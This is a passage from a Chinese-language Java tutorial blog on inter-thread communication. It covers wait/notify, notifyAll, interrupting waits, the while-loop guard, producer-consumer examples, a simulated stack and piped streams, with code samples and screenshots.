class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220812224743210.png" alt="image-20220812224743210"></p>
<h2 id="4-线程间的通信"><a href="#4-线程间的通信" class="headerlink" title="4.线程间的通信"></a>4.线程间的通信</h2><h4 id="等待-通知机制"><a href="#等待-通知机制" class="headerlink" title="等待/通知机制"></a>等待/通知机制</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>在多线程编程中,可能线程A的条件没有满足只是暂时的,稍后其他的线程B可能会更新条件使得A线程的条件得到满足,可以将A线程暂停,直到它的条件得到满足后,再将A线程唤醒</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="Object-wait"><a href="#Object-wait" class="headerlink" title="Object#wait()"></a>Object#wait()</h5><p><code>Object#wait()</code>方法可以是执行当前代码的线程等待,暂停执行直到接到通知或被中断为止</p>
<p><strong>注意:</strong></p>
<ol>
<li><strong>wait()方法只能在同步代码块中由锁对象调用</strong></li>
<li><strong>调用wait()方法,当前线程会释放锁</strong></li>
</ol>
<p>伪代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在调用wait()方法前获得对象的内部锁</span></span><br><span class="line"><span class="keyword">synchronized</span>(锁对象)&#123;</span><br><span class="line">    <span class="keyword">while</span>(条件不成立)&#123;</span><br><span class="line">        <span class="comment">//通过锁对象调用wait()方法暂停线程,会释放锁对象</span></span><br><span class="line">        锁对象.wait();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//线程的条件满足了继续向下执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wait(long)也可以提供一个毫秒让它到时间自动唤醒</p>
<h5 id="Object-notify"><a href="#Object-notify" class="headerlink" title="Object#notify()"></a>Object#notify()</h5><p>Object类的notify()可以唤醒线程,<strong>该方法也必须在同步代码块中由锁对象调用</strong>,没有使用锁对象调用wait()/notify()会抛出IllegalMonitorStateException异常,如果有多个等待的线程,notify()方法只能唤醒其中的一个,<strong>在同步代码块中调用nitify()方法后,并不会立即释放锁对象,需要等当前同步代码看执行完后才会释放锁对象,一般将notify方法放在同步代码块的最后</strong></p>
<p>伪代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">synchronized</span>(锁对象)&#123;</span><br><span class="line">    <span class="comment">//执行修改保护条件的代码</span></span><br><span class="line">    <span class="comment">//唤醒其他线程</span></span><br><span class="line">    锁对象.notify();   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        String lock=<span class="string">&quot;hello!!!&quot;</span>;<span class="comment">//定义一个String类作为锁对象</span></span><br><span class="line">        Thread t1=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (lock)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;线程1开始等待&quot;</span>+System.currentTimeMillis());</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        lock.wait();<span class="comment">//线程等待,会释放锁对象,线程进入blocked阻塞状态</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">&quot;线程1等待结束&quot;</span>+System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Thread t2=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">//notify方法也需要在同步代码块中由锁对象调用</span></span><br><span class="line">                <span class="keyword">synchronized</span> (lock)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;线程2开始唤醒&quot;</span>+System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">                    lock.notify();<span class="comment">//唤醒在lock锁对象上等待的某一个线程</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;线程2唤醒结束&quot;</span>+System.currentTimeMillis());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        t1.start();</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220815175756390.png" alt="image-20220815175756390"></p>
<h5 id="notify不会立即释放锁对象"><a href="#notify不会立即释放锁对象" class="headerlink" title="notify不会立即释放锁对象"></a>notify不会立即释放锁对象</h5><p><strong>唤醒线程不会立即释放锁对象,需要等到当前同步代码块都执行完后才能释放锁对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        List&lt;String&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Thread t1=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (list)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(list.size()!=<span class="number">5</span>)&#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;线程1开始等待&quot;</span>+System.currentTimeMillis());</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            list.wait();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        System.out.println(<span class="string">&quot;线程1被唤醒&quot;</span>+System.currentTimeMillis());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Thread t2=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (list)&#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">                        list.add(<span class="string">&quot;string&quot;</span>+i);</span><br><span class="line">                        System.out.println(<span class="string">&quot;t2添加了第&quot;</span>+i+<span class="string">&quot;个数据&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span>(list.size()==<span class="number">5</span>)&#123;</span><br><span class="line">                            list.notify();</span><br><span class="line">                            System.out.println(<span class="string">&quot;线程2已结发起唤醒通知&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        t1.start();</span><br><span class="line">        Thread.sleep(<span class="number">500</span>);<span class="comment">//保证线程1先执行</span></span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220816003428991.png" alt="image-20220816003428991" style="zoom:80%;" />

<h5 id="interrupt-方法会中断wait"><a href="#interrupt-方法会中断wait" class="headerlink" title="interrupt()方法会中断wait()"></a>interrupt()方法会中断wait()</h5><p>当线程处于wait()等待状态时, 调佣线程对象的interrupt()方法会中断线程的等待状态,会产生Interrupted</p>
<p>中断线程会唤醒线程等待</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object LOCK=<span class="keyword">new</span> Object();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread t1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (LOCK)&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;等待开始&quot;</span>);</span><br><span class="line">                        LOCK.wait();</span><br><span class="line">                        System.out.println(<span class="string">&quot;等待结束&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;wait被中断了&quot;</span>);</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        t1.start();</span><br><span class="line">        t1.interrupt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220816140527344.png" alt="image-20220816140527344"></p>
<h5 id="notify-与notifyAll"><a href="#notify-与notifyAll" class="headerlink" title="notify()与notifyAll()"></a>notify()与notifyAll()</h5><p>锁对象.notify()一次只能唤醒一个线程,如果有多个等待的线程,只能随机唤醒其中的某一个,想要唤醒所有等待的线程,需要调用锁对象.notifyAll()</p>
<h5 id="通知过早"><a href="#通知过早" class="headerlink" title="通知过早"></a>通知过早</h5><p>如果先开启通知线程,再开启等待线程,可能会出现t1线程等待没有收到通知的情况</p>
<p>比较好的解决办法就是设置一个isFirst的静态布尔变量,当线程是第一个开启的就等待</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread1&#123;</span><br><span class="line">    <span class="keyword">while</span>(isFirst)&#123;</span><br><span class="line">    	锁对象.lock()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">Thread2&#123;</span><br><span class="line">    锁对象.notify()</span><br><span class="line">    isFirst=<span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="wait条件发生了变化"><a href="#wait条件发生了变化" class="headerlink" title="wait条件发生了变化"></a>wait条件发生了变化</h5><p>在使用wait/notify模式时,注意wait条件发生了变化,也可能会造成程序逻辑的混乱</p>
<p>先开启添加数据的线程,再开启一个取数据的线程,大多数情况下会正常取数据</p>
<p>先开启取数据的线程,再开启添加数据的线程,取数据的线程会先等待,等到添加数据之后nofity后再取数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> List list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">subtract</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (list)&#123;</span><br><span class="line">            <span class="keyword">if</span>(list.size()==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+<span class="string">&quot;开始等待&quot;</span>);</span><br><span class="line">                    list.wait();</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+<span class="string">&quot;结束等待&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            Object o = list.remove(<span class="number">0</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;从集合中取了&quot;</span>+o+<span class="string">&quot;,,,剩余数量为&quot;</span>+list.size());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (list)&#123;</span><br><span class="line"></span><br><span class="line">            list.add(<span class="string">&quot;datum&quot;</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;添加了一条数据&quot;</span>);</span><br><span class="line">            list.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SubtractThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            subtract();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AddThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            add();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        SubtractThread subtractThread1=<span class="keyword">new</span> SubtractThread();</span><br><span class="line">        SubtractThread subtractThread2=<span class="keyword">new</span> SubtractThread();</span><br><span class="line">        subtractThread1.setName(<span class="string">&quot;subtractThread1&quot;</span>);</span><br><span class="line">        subtractThread2.setName(<span class="string">&quot;subtractThread2&quot;</span>);</span><br><span class="line">        AddThread addThread1=<span class="keyword">new</span> AddThread();</span><br><span class="line">        addThread1.setName(<span class="string">&quot;addThread1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//开启两个取数据的线程,再开启添加数据的线程</span></span><br><span class="line">        subtractThread1.start();</span><br><span class="line">        subtractThread2.start();</span><br><span class="line">        addThread1.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220817201024794.png" alt="image-20220817201024794" style="zoom: 80%;" />

<p>当等待的线程被唤醒后,需要再判断一次集合中是否有数据可取,即需要把subtract()方法中的if判断改为while,改完后上述代码执行结果发生如下转变</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220817201159396.png" alt="image-20220817201159396"></p>
<h4 id="生产者消费者设计模式"><a href="#生产者消费者设计模式" class="headerlink" title="生产者消费者设计模式"></a>生产者消费者设计模式</h4><p>有多个线程的时候为了防止取不到值的问题,把if改为while</p>
<p>ValueOP</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.producerTest;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValueOP</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String value=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//定义方法修改value的值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">            <span class="comment">//如果不是空串就等待</span></span><br><span class="line">            <span class="keyword">while</span> (!value.equalsIgnoreCase(<span class="string">&quot;&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果value值是空串,就设置value字段的值</span></span><br><span class="line">            String value=System.currentTimeMillis()+<span class="string">&quot;--&quot;</span>+System.nanoTime();</span><br><span class="line">            System.out.println(<span class="string">&quot;set设置的值是:&quot;</span>+value);</span><br><span class="line">            <span class="keyword">this</span>.value=value;</span><br><span class="line">            <span class="keyword">this</span>.notify();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getValue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">            <span class="comment">//是空串就等待</span></span><br><span class="line">            <span class="keyword">while</span> (value.equalsIgnoreCase(<span class="string">&quot;&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//不是空串,读取字段值</span></span><br><span class="line">            System.out.println(<span class="string">&quot;get的值是:&quot;</span>+value);</span><br><span class="line">            <span class="keyword">this</span>.value=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">this</span>.notify();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ProducerThread</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.producerTest;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProducerThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ValueOP obj;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ProducerThread</span><span class="params">(ValueOP obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            obj.setValue();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ConsumerThread</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.producerTest;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConsumerThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ValueOP obj;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConsumerThread</span><span class="params">(ValueOP obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            obj.getValue();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ValueOP valueOP=<span class="keyword">new</span> ValueOP();</span><br><span class="line">        ProducerThread p1=<span class="keyword">new</span> ProducerThread(valueOP);</span><br><span class="line">        ProducerThread p2=<span class="keyword">new</span> ProducerThread(valueOP);</span><br><span class="line">        ProducerThread p3=<span class="keyword">new</span> ProducerThread(valueOP);</span><br><span class="line">        ConsumerThread c1=<span class="keyword">new</span> ConsumerThread(valueOP);</span><br><span class="line">        ConsumerThread c2=<span class="keyword">new</span> ConsumerThread(valueOP);</span><br><span class="line">        ConsumerThread c3=<span class="keyword">new</span> ConsumerThread(valueOP);</span><br><span class="line"></span><br><span class="line">        p1.start();</span><br><span class="line">        c1.start();</span><br><span class="line">        p2.start();</span><br><span class="line">        c2.start();</span><br><span class="line">        p3.start();</span><br><span class="line">        c3.start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220818165125092.png" alt="image-20220818165125092"></p>
<p>但是上述代码可能会出现线程假死的状态,所有线程一直处于等待状态</p>
<p>大概原因是锁对象.notify()是随机唤醒一个线程,有很大可能不是按照预期的,消费结束就去唤醒生产者线程</p>
<p>所以需要将上述ValueOP类代码中的notify()改为notifyAll()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValueOP</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String value=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//定义方法修改value的值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">            <span class="comment">//如果不是空串就等待</span></span><br><span class="line">            <span class="keyword">while</span> (!value.equalsIgnoreCase(<span class="string">&quot;&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果value值是空串,就设置value字段的值</span></span><br><span class="line">            String value=System.currentTimeMillis()+<span class="string">&quot;--&quot;</span>+System.nanoTime();</span><br><span class="line">            System.out.println(<span class="string">&quot;set设置的值是:&quot;</span>+value);</span><br><span class="line">            <span class="keyword">this</span>.value=value;</span><br><span class="line">            <span class="keyword">this</span>.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getValue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">            <span class="comment">//是空串就等待</span></span><br><span class="line">            <span class="keyword">while</span> (value.equalsIgnoreCase(<span class="string">&quot;&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//不是空串,读取字段值</span></span><br><span class="line">            System.out.println(<span class="string">&quot;get的值是:&quot;</span>+value);</span><br><span class="line">            <span class="keyword">this</span>.value=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">this</span>.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="模拟栈"><a href="#模拟栈" class="headerlink" title="模拟栈"></a>模拟栈</h5><p>相比上面的操作方式,还可以通过模拟栈的方式,来安排消费者和生产者</p>
<p>MyStack.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义类模拟栈</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List list= <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX=<span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//当栈已满,就等待\</span></span><br><span class="line">        <span class="keyword">while</span> (list.size()&gt;=MAX)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;开始等待&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String data=<span class="string">&quot;data---&quot;</span>+Math.random();</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;添加了数据&quot;</span>+data);</span><br><span class="line">        list.add(data);</span><br><span class="line">        <span class="keyword">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (list.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;开始等待&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;出栈数据:  &quot;</span>+list.remove(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="通过管道实现线程间的通信"><a href="#通过管道实现线程间的通信" class="headerlink" title="通过管道实现线程间的通信"></a>通过管道实现线程间的通信</h4><p>通过管道在两个线程之间传输字节流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        PipedInputStream inputStream=<span class="keyword">new</span> PipedInputStream();</span><br><span class="line">        PipedOutputStream outputStream=<span class="keyword">new</span> PipedOutputStream();</span><br><span class="line">        <span class="comment">//在输入管道流与输出管道流之间建立连接</span></span><br><span class="line">        inputStream.connect(outputStream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建新线程向管道流中写入数据</span></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                writeData(outputStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                readData(inputStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writeData</span><span class="params">(PipedOutputStream out)</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span 